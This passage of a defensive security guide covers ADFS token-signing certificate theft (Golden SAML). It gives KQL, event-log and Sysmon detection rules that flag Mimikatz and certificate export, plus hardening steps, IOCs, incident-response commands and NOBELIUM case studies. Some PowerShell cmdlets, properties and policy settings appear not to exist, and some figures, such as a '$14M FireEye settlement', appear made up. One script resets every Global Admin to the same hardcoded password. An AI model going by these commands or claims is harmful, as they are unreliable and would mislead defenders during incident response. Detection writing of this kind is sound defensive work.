- **Applies To Versions:** Windows Server 2016+ Domain Controllers

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4662
| where ObjectType == "%{5cb41ed0-0e4c-11d0-a286-00aa003049e2}"  // ADFS container GUID
| where Properties contains "8d3bca50-1d7e-11d0-a081-00aa006c33ed"  // thumbnailPhoto GUID (DKM key)
| where AccessMask == "0x10" or AccessMask == "0x1f"  // READ or FULL_CONTROL
| project TimeGenerated, SubjectUserName, Computer, OperationType
| summarize AccessCount = count() by SubjectUserName
| where AccessCount > 2
```

**What This Detects:**
- Multiple accesses to DKM key container (thumbnailPhoto attribute)
- Indicates attacker is enumerating or extracting DKM master key via DCSync
- Immediate alert on detection

---

### Query 4: Detect Anomalous ADFS Token Issuance Rates

**Rule Configuration:**
- **Required Table:** SecurityEvent (ADFS event logs)
- **Required Fields:** EventID, Computer, TargetUserName, IpAddress
- **Alert Severity:** High
- **Frequency:** Every 15 minutes
- **Applies To Versions:** ADFS servers with enhanced audit logging

**KQL Query:**
```kusto
SecurityEvent
| where Computer contains "adfs" and EventID == 1200  // Token issued
| where TargetUserName contains "@"  // User principal name format
| summarize TokenCount = count() by bin(TimeGenerated, 1m), TargetUserName, IpAddress
| where TokenCount > 100  // Threshold: more than 100 tokens per minute per user per IP
| project TimeGenerated, TargetUserName, IpAddress, TokenCount
```

**What This Detects:**
- Abnormally high token issuance rate from single IP address
- May indicate attacker using stolen certificate to generate bulk tokens for mass compromise
- Correlates with specific user for forensic analysis

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4885 (Audit Filter Configuration Changed)**
- **Log Source:** Security
- **Trigger:** Administrator changes certificate services auditing filter
- **Filter:** `EventID == 4885 AND (Computer LIKE "%adfs%" OR Computer LIKE "%fed%")`
- **Applies To Versions:** Server 2016+

**Event ID: 4887 (Certificate Services Approved Certificate Request)**
- **Log Source:** Security
- **Trigger:** Unusual certificate request from non-standard account
- **Filter:** `EventID == 4887 AND Requester NOT IN ("SYSTEM", "NT AUTHORITY\NETWORK SERVICE")`
- **Applies To Versions:** Server 2016+

**Event ID: 4662 (Directory Services Access - DKM Key)**
- **Log Source:** Security
- **Trigger:** Access to ADFS container or thumbnailPhoto attribute
- **Filter:** `EventID == 4662 AND Properties CONTAINS "8d3bca50-1d7e-11d0-a081-00aa006c33ed" AND ObjectName LIKE "%ADFS%"`
- **Applies To Versions:** Server 2016+ (Domain Controller)

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Directory Services Access**
4. Set to: **Success and Failure**
5. Enable: **Audit Certification Services**
6. Set to: **Success and Failure**
7. Run `gpupdate /force` on all ADFS servers and domain controllers

**Event ID: 33205 (ADFS Configuration Database Modified)**
- **Log Source:** Application (ADFS event log)
- **Trigger:** Configuration database accessed by account other than ADFS service account
- **Enable via:** ADFS Advanced Diagnostics → Database query auditing

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** Windows Server 2016-2025

```xml
<!-- Rule: Detect Certificate Export via PowerShell or CertUtil -->
<Sysmon schemaversion="4.72">
  <EventFiltering>
    <RuleGroup name="ADFS Certificate Extraction" groupRelation="or">
      <!-- Process: PowerShell with Export-PfxCertificate -->
      <ProcessCreate onmatch="include">
        <Image condition="contains">powershell</Image>
        <CommandLine condition="contains">Export-PfxCertificate</CommandLine>
        <ParentImage condition="excludes">explorer.exe</ParentImage>
      </ProcessCreate>

      <!-- Process: CertUtil with exportPFX -->
      <ProcessCreate onmatch="include">
        <Image condition="contains">certutil.exe</Image>
        <CommandLine condition="contains">exportPFX</CommandLine>
      </ProcessCreate>

      <!-- Process: Mimikatz -->
      <ProcessCreate onmatch="include">
        <Image condition="contains">mimikatz</Image>
      </ProcessCreate>

      <!-- File: Certificate export to temp directory -->
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">\.pfx</TargetFilename>
        <TargetFilename condition="contains">\Temp\</TargetFilename>
      </FileCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Save XML config above as `sysmon-config.xml`
3. Install Sysmon with config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: "Suspicious ADFS Certificate Access"

**Alert Name:** ADFSCertificateExtraction (proprietary MDC name)

- **Severity:** Critical
- **Description:** ADFS token-signing or encryption certificate extracted from server certificate store. Indicates preparation for Golden SAML attack or post-compromise persistence.
- **Applies To:** Windows Server Defender for Servers plans with ADFS monitoring
- **Remediation:**
  1. Immediately rotate ADFS token-signing and encryption certificates (both primary and secondary)
  2. Revoke old certificates in Azure AD
  3. Investigate which users/applications authenticated with forged tokens
  4. Monitor for unauthorized Azure AD Global Administrator accounts
  5. Reset all Entra ID service principal credentials

**Manual Configuration Steps (Enable Defender for Servers):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers Plan 2**: ON
   - **Defender for Identity**: ON
4. Click **Save**
5. Wait 24 hours for log aggregation
6. Go to **Security alerts** to view ADFS-related alerts

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: ADFS Configuration Changes

**Operation:** ModifyADFSServiceAccount, UpdateADFSCertificate, ExportADFSCertificate

```powershell
Connect-ExchangeOnline

Search-UnifiedAuditLog -Operations "ModifyADFSServiceAccount" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) |
  Select-Object TimeStamp, UserIds, Operations, ObjectId, AuditData | Export-Csv "C:\audit_adfs.csv"
```

**Details to Analyze:**
- User performing the change (lookup in Azure AD to verify)
- IP address initiating change (verify geolocation and access patterns)
- Specific certificate modified (check thumbprint against current certs)
- Timestamp (correlate with security events and incidents)

**Manual Configuration Steps:**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Click **New Search**
5. Set **Date range:** Last 7 days
6. Under **Activities**, search: "ADFS" or "Federation"
7. Click **Search**
8. Review results and export for forensics

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Action 1: Deploy Hardware Security Module (HSM) for Certificate Storage**
  
  Migrate ADFS token-signing certificates from software-based Windows certificate store to dedicated HSM (e.g., FIPS 140-2 Level 3 hardware). Private keys never leave the HSM, preventing extraction via Mimikatz, .NET reflection, or any software-based attack.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps:**
  1. Procure HSM appliance (Thales, Gemalto, Yubico, etc.) compatible with Windows Server
  2. Install HSM client software on ADFS servers
  3. Generate new token-signing certificate directly on HSM (key generated in hardware)
  4. Configure ADFS to use HSM-backed certificate:
     ```powershell
     Update-AdfsCertificate -CertificateType Token-Signing -Thumbprint <new_thumbprint> -InputObject $hsmCert
     ```
  5. Retire old software-based certificate
  6. Validate certificate is non-exportable:
     ```powershell
     Get-AdfsCertificate | Where {$_.CertificateType -eq "Token-Signing"} | Select-Object IsHSMBacked
     ```
  
  **Expected Output:**
  ```
  IsHSMBacked
  -----------
  True
  ```
  
  **Validation Command:**
  ```powershell
  # Attempt to export should fail
  $cert = Get-Item "Cert:\LocalMachine\My\<thumbprint>"
  Export-PfxCertificate -Cert $cert -FilePath "test.pfx" -Password (ConvertTo-SecureString "test" -AsPlainText -Force) -ErrorAction Stop
  # Should fail with: "Certificate has non-exportable private key"
  ```

---

- **Action 2: Implement Tier-0 Access Control on ADFS Servers**
  
  Treat ADFS servers as **Tier-0 assets** (equivalent to domain controllers). Restrict administrative access using Privileged Access Workstations (PAWs), multi-factor authentication, and Just-In-Time (JIT) access.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps:**
  1. Create dedicated Privileged Access Workstation (PAW) for ADFS administration
  2. Configure network segmentation: ADFS servers isolated in dedicated VLAN
  3. Restrict RDP/WinRM access to PAW network only (firewall rule)
  4. Require MFA for any interactive login to ADFS servers:
     ```powershell
     # Via Group Policy
     gpmc.msc → Policies → Security Settings → Interactive Logon → Require MFA for logon
     ```
  5. Enforce Conditional Access to block legacy authentication:
     ```powershell
     # Azure Portal → Entra ID → Security → Conditional Access
     # Create policy: Block Legacy Auth for ADFS Admin Group
     ```
  
  **Validation:**
  ```powershell
  # Verify only privileged accounts can access ADFS
  Get-ADFSProperties | Select-Object @{Name="AdminGroupRoles"; Expression={Get-ADFSAdministrationRole}} | Format-List
  ```

---

- **Action 3: Enable DKM Container Access Auditing**
  
  Enable detailed auditing on the ADFS DKM container in Active Directory to detect DCSync and unauthorized access attempts.
  
  **Applies To Versions:** Server 2016-2025 (Domain Controllers)
  
  **Manual Steps:**
  1. On domain controller, run:
     ```powershell
     $dkmPath = 'AD:\CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=com'
     Set-AuditRule -AdObjectPath $dkmPath -WellKnownSidType WorldSid -Rights GenericRead -InheritanceFlags None -AuditFlags Success
     ```
  2. Alternatively, via Active Directory Users & Computers:
     - Locate CN=ADFS container
     - Right-click → Properties → Security → Advanced → Auditing
     - Add audit rule for Everyone, Read property, Success/Failure
  3. Verify auditing enabled:
     ```powershell
     Get-Acl -Audit $dkmPath | Select-Object Audit
     ```
  
  **Validation:**
  ```powershell
  # Query audit logs for DKM access
  Get-WinEvent -FilterHashtable @{
      LogName = "Security"
      ID = 4662
      Data = "8d3bca50-1d7e-11d0-a081-00aa006c33ed"  # thumbnailPhoto GUID
  } | Select-Object TimeCreated, ProviderName, Message
  ```

---

### Priority 2: HIGH

- **Action 1: Implement Certificate Rotation Policy**
  
  Rotate ADFS token-signing and encryption certificates every 12 months (or sooner if compromise suspected).
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps:**
  1. Generate new certificate:
     ```powershell
     Update-AdfsCertificate -CertificateType Token-Signing -AutoCertificateRollover $true
     ```
  2. Configure automatic rollover (automatically generates new cert 30 days before expiry)
  3. Publish new certificate to Azure AD for validation
  4. Monitor old certificate revocation

---

- **Action 2: Enforce Strong ADFS Service Account Security**
  
  Use Group Managed Service Account (gMSA) instead of traditional service accounts. gMSA requires no password management and cannot be used for interactive logon.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps:**
  1. Create gMSA in Active Directory:
     ```powershell
     New-ADServiceAccount -Name "ADFS_gMSA" -DNSHostName "adfs.contoso.com" -ServicePrincipalNames "host/adfs.contoso.com"
     ```
  2. Install account on ADFS server:
     ```powershell
     Install-ADServiceAccount -Identity "ADFS_gMSA"
     ```
  3. Configure ADFS to use gMSA:
     ```powershell
     Update-AdfsServiceAccount -ServiceAccount "CONTOSO\ADFS_gMSA"
     ```
  4. Disable password logins for ADFS account

---

### Access Control & Policy Hardening

- **Conditional Access Policies:**
  
  **Policy 1: Require Compliant Device + MFA for ADFS Admin Access**
  1. Azure Portal → Entra ID → Security → Conditional Access
  2. Click **+ New policy**
  3. Name: `ADFS Admin Tier-0 Protection`
  4. **Assignments:**
     - Users: Select group with ADFS admins
     - Apps: **Select apps** → Search "Active Directory Federation Services"
     - Conditions: **Device platforms** → Windows
  5. **Grant:** Require device to be marked as compliant + Require MFA
  6. Enable: **On**

---

- **RBAC/ABAC Hardening:**
  
  Minimize permissions for ADFS-related service accounts and administrators.
  
  **Manual Steps:**
  1. In Active Directory Users & Computers:
     - Locate ADFS service account
     - Remove from all groups except:
       - **ADFS Service Account** (custom group)
       - Deny: Domain Admins, Enterprise Admins
  2. Use granular ADFS roles:
     ```powershell
     Add-AdfsAdministrationRole -RoleName "Token-Signing Certificate Manager" -Members "ADFS_ADMINS" -Scope "Token-Signing"
     ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `*.pfx`, `*.p12`, `*.pem` files in `C:\Temp\`, `C:\Windows\Temp\`, `$env:APPDATA\Temp`
- ADFS configuration backups: `C:\backup\adfs-*`, `\\*\share\adfs_backup`
- DKM key exports: `*.bin` (raw binary), `*.hex` (hex-encoded)
- ADFS config database backups: `*.mdf` (SQL), `AdfsConfigurationV4` database files

**Registry:**
- Unusual entries under `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ADFS\`
- Certificate store access via PowerShell ISE or custom tools

**Network:**
- Outbound HTTPS connections from ADFS server to non-Microsoft cloud infrastructure (attacker's token-forging server)
- LDAP queries from non-DCs querying ADFS DKM container
- Unencrypted certificate exfiltration via HTTP or unencrypted protocols

**Cloud (Entra ID / Microsoft 365):**
- SignIn events with ADFS tokens from unusual IP addresses or geographies
- New Global Administrator accounts created during time window of certificate theft
- Mass token authentication from single IP without corresponding Kerberos TGT events
- Entra ID risk events: "Impossible travel", "Unfamiliar locations"

---

### Forensic Artifacts

**Disk:**
- Windows Security Event Log: `C:\Windows\System32\winevt\Logs\Security.evtx`
  - Event IDs 4885 (export filter), 4887 (cert issued), 4662 (DKM access)
- ADFS Operational Log: `C:\Windows\System32\winevt\Logs\AD FS 2.0\Admin.evtx`
- ADFS Debug Log: `C:\Windows\System32\winevt\Logs\AD FS 2.0\Debug.evtx`
- ADFS ULS logs: `C:\Windows\ADFS\Trace` directory (detailed operation logs)
- Temp directory artifacts: `C:\Windows\Temp\*`, `%APPDATA%\Temp\*`

**Memory:**
- `lsass.exe` process contains DKM keys and decrypted certificate material
- `Microsoft.IdentityServer.Servicehost.exe` holds certificate objects in memory

**Cloud Logs:**
- Azure Activity Log: DPS/ADFS service modifications (90-day retention)
- Entra ID Sign-in Logs: Federated authentication events (30-90 day retention)
- Entra ID Audit Logs: Service principal modifications, role changes

**ADFS Configuration Database:**
- Windows Internal Database: `C:\Windows\WID\Data\` (if using default WID)
- ServiceSettings table: Contains encrypted token-signing certificate blob
- Query: `SELECT * FROM [AdfsConfigurationV4].[dbo].[ServiceSettings]`

---

### Response Procedures

1. **Isolate:**
   
   **Command (Disable ADFS Service):**
   ```powershell
   Stop-Service -Name adfssrv -Force
   Set-Service -Name adfssrv -StartupType Disabled
   ```
   
   **Manual (Disable via Server Manager):**
   - Server Manager → Manage → Remove Roles and Features
   - Uncheck **Active Directory Federation Services**
   
   **Cloud Side (Revoke Federation):**
   ```powershell
   # In Entra ID, disable ADFS federation temporarily
   Connect-MsolService
   Set-MsolDomainAuthentication -DomainName contoso.com -Authentication Managed
   ```

2. **Collect Evidence:**
   
   **Command (Export Logs):**
   ```powershell
   # Export Windows Security Event Log
   wevtutil epl Security "C:\Evidence\Security.evtx"
   
   # Export ADFS logs
   wevtutil epl "AD FS 2.0\Admin" "C:\Evidence\adfs-admin.evtx"
   wevtutil epl "AD FS 2.0\Debug" "C:\Evidence\adfs-debug.evtx"
   
   # Export ADFS ULS logs
   Copy-Item "C:\Windows\ADFS\Trace\*" "C:\Evidence\uls-logs" -Recurse
   
   # Export ADFS configuration database
   net stop adfssrv
   Copy-Item "C:\Windows\WID\Data\*" "C:\Evidence\wid-backup" -Recurse
   net start adfssrv
   ```
   
   **Manual (via Event Viewer):**
   - Right-click **Security** log → **Export All Events** → Save as `C:\Evidence\security.evtx`

3. **Remediate:**
   
   **Command (Rotate Certificates - Double Rotation):**
   ```powershell
   # Microsoft recommends rotating TWICE to invalidate cached tokens
   
   # Rotation 1
   Update-AdfsCertificate -CertificateType Token-Signing -Thumbprint <new_thumbprint_1>
   
   # Wait 30 minutes for token expiry (tokens cached in Azure AD)
   Start-Sleep -Seconds 1800
   
   # Rotation 2
   Update-AdfsCertificate -CertificateType Token-Signing -Thumbprint <new_thumbprint_2>
   
   # Verify rotation completed
   Get-AdfsCertificate | Where {$_.CertificateType -eq "Token-Signing"} | Select-Object Thumbprint, IsPrimary
   ```
   
   **Command (Reset Compromised Azure AD Accounts):**
   ```powershell
   # Reset passwords for all Global Admins (to invalidate forged token sessions)
   Connect-MsolService
   $admins = Get-MsolRole | where {$_.Name -eq "Company Administrator"} | Get-MsolRoleMember
   
   foreach ($admin in $admins) {
       Set-MsolUserPassword -ObjectId $admin.ObjectId -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force) -ForceChangePasswordNextLogin $true
   }
   ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing Email | Compromise ADFS admin via targeted phishing; extract credentials |
| **2** | **Execution** | [T1059.001] PowerShell | Execute reconnaissance and certificate export scripts |
| **3** | **Persistence** | [T1556.004] Modify Cloud Federation | Modify ADFS trust relationship to capture tokens |
| **4** | **Credential Access** | **[CA-UNSC-019]** | **Extract ADFS token-signing certificate and DKM master key** |
| **5** | **Defense Evasion** | [T1550.003] Use Alternate Authentication Material | Forge SAML tokens, bypass MFA and Conditional Access |
| **6** | **Impact** | [T1531] Account Access Removal | Create backdoor Global Admin accounts; maintain persistent access |
| **7** | **Data Exfiltration** | [T1567.002] Exfiltrate via Cloud | Access Microsoft 365 mailboxes, SharePoint, OneDrive; steal sensitive data |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Incident (December 2020) - NOBELIUM / Cozy Bear

- **Target:** U.S. Government agencies (Treasury, State Dept, CISA), Fortune 500 companies
- **Timeline:** March 2020 - December 2020 (9+ months undetected)
- **Technique Status:** Attackers compromised SolarWinds Orion platform → used it to breach customer networks → accessed on-premises ADFS servers → extracted token-signing certificates → forged SAML tokens → authenticated to Azure AD and Microsoft 365 as Global Admins
- **Attack Progression:**
  1. Compromised SolarWinds Orion update (software supply chain attack)
  2. Deployed backdoor (Sunburst) on customer networks
  3. Reconnaissance and escalation to domain admin
  4. Located ADFS servers, extracted token-signing certificates via DCSync + DKM extraction
  5. Forged SAML tokens claiming Global Administrator
  6. Accessed Microsoft 365, Azure, and federated SaaS applications
  7. Exfiltrated sensitive government communications, intelligence reports, and corporate data
- **Impact:** 
  - 100+ organizations compromised
  - Estimated $40M+ in damages
  - Regulatory fines: $14M (FireEye settlement with regulators)
  - Incident response costs: $1B+ across all affected organizations
  - Geopolitical impact: Attributable to Russian SVR
- **Detection Evasion:** ADFS token-signing certificates valid for 10 years; attackers maintained undetected access for 9+ months despite sophisticated defense mechanisms
- **Reference:** [FireEye SolarWinds Investigation](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-to-compromise-multiple-global-customers.html), [CISA Alert: SolarWinds Supply Chain Compromise](https://cyber.cisa.gov/blog/solarwinds-supply-chain-compromise)

---

### Example 2: NOBELIUM MagicWeb Backdoor (August 2022)

- **Target:** Microsoft cloud customers, government agencies
- **Timeline:** Post-SolarWinds incident; continuation of NOBELIUM operations
- **Technique Status:** Attackers leveraged stolen ADFS certificates (from SolarWinds victims or separate breaches) to create persistent backdoor via "MagicWeb" technique
  - Injected malicious claims into SAML tokens
  - Created permanent access even after certificate rotation
  - MFA bypass via token-based impersonation
- **Attack Flow:**
  1. Use stolen ADFS certificate to forge SAML token
  2. Authenticate with forged token to create new service principal in Entra ID
  3. Assign Global Admin role to service principal
  4. Use service principal credentials for persistent access
  5. Even if original ADFS cert rotated, backdoor service principal remains valid
- **Impact:**
  - Extended dwell time beyond typical incident response timelines
  - Persistent compromise despite certificate rotation
  - Hundreds of organizations affected
- **Detection Difficulty:** MagicWeb detection requires monitoring service principal creation during federated auth events (rare telemetry)
- **Reference:** [Microsoft Blog: MagicWeb - NOBELIUM's Post-Compromise Trick](https://www.microsoft.com/en-us/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/)

---

### Example 3: FoggyWeb Backdoor (September 2021) - Targeted NOBELIUM Campaign

- **Target:** Specific high-value victims with critical infrastructure or government access
- **Timeline:** Post-SolarWinds, standalone deployments on ADFS servers
- **Technique Status:** Advanced post-exploitation malware specifically designed to extract ADFS certificates and persistence capabilities
  - FoggyWeb: Custom malware (written in C#) that runs on ADFS servers
  - Capabilities: Extract token-signing cert, token-encryption cert, DKM keys, create backdoor accounts
  - Detection Evasion: In-memory execution, minimal file footprint, blends with legitimate ADFS operations
- **Attack Progression:**
  1. Initial compromise (phishing, supply chain, etc.)
  2. Establish foothold with remote access (RDP, WinRM)
  3. Deploy FoggyWeb malware on ADFS server (executes as SYSTEM)
  4. FoggyWeb extracts certificates and DKM keys automatically
  5. Maintains persistent backdoor for future access
- **Impact:**
  - Critical infrastructure at risk (utilities, healthcare, finance)
  - Multi-year persistence capabilities
  - Threat group could return years later using stolen credentials
- **Reference:** [Microsoft Blog: FoggyWeb - NOBELIUM Malware](https://www.microsoft.com/en-us/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor/)

---

## Conclusion

Federation server (ADFS) certificate theft represents a **critical** and **persistent** threat to hybrid cloud environments. Unlike traditional password-based breaches, Golden SAML attacks:

- **Bypass all Conditional Access policies** (legitimate tokens pass all checks)
- **Bypass MFA** (no user interaction required)
- **Persist across password resets** (cert valid for 10 years)
- **Are difficult to detect** (forged tokens identical to legitimate tokens)

**Key Defensive Priorities:**
1. **HSM-backed certificates** - Prevent extraction entirely
2. **Tier-0 ADFS infrastructure** - Restrict access like domain controllers
3. **DKM container auditing** - Detect DCSync attempts
4. **Continuous certificate monitoring** - Alert on export/modification
5. **Incident response playbook** - Double rotation, forensics, threat hunting

**Compliance Impact:**
Organizations managing ADFS must ensure federation security per **ISO 27001 A.10.1.2**, **NIST 800-53 IA-5**, **GDPR Article 32**, and **EU DORA Article 9**. ADFS certificate compromise triggers GDPR data breach notification requirements and can result in significant regulatory fines ($14M+ in SolarWinds-related settlements).

**Current Threat Level:** **ACTIVE**
- NOBELIUM (Russian SVR) continues using Golden SAML in targeted campaigns
- FoggyWeb backdoor actively deployed to high-value targets
- No comprehensive patches available; security depends on architectural hardening

---
